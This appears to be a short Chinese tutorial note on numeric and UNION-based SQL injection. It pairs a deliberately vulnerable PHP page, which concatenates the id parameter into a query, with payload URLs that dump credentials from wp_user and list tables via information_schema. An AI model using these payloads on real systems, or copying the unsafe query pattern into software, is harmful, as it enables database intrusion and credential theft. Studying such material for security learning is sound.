## Sql Injection
### 1.数字型和Union注入

```
sql1.php
<?php
// connect
$conn = sql_connect("127.0.0.1", "root", "root", "test")
$res = mysqli_query($conn, "SELECT title, content FROM wp_news WHERE id=".$_GET['id']);
$row = mysqli_fetch_array($res);
echo "<center>";
echo "<h1>".$row['title']."</h1>";
echo "<br/>";
echo "<h1>".$row['content']."</h1>";
echo "</center>";
?>
```

## 1.1 注入尝试1, sql解析
`http://example.com/test.php?id=2` <br/>
`http://example.com/test.phph?id=3-1` <br/>
两者等价, 说明3-1进行了解析 <br/>
## 1.2 union联合查找
`http://example.com/test.php?id=1+union+select+user,pwd+from+wp_user+limit+1,1` <br/>
union查询把两个结果并在一起, 通过limit1,1 取出后面查询结果的第一条

## 1.3 通用攻击,对information_schema
`http://192.168.20.133/sql1.php？id=-1 union select 1，group_concat
(table_name) from information_schema.tables where table_schema=database()` <br/>


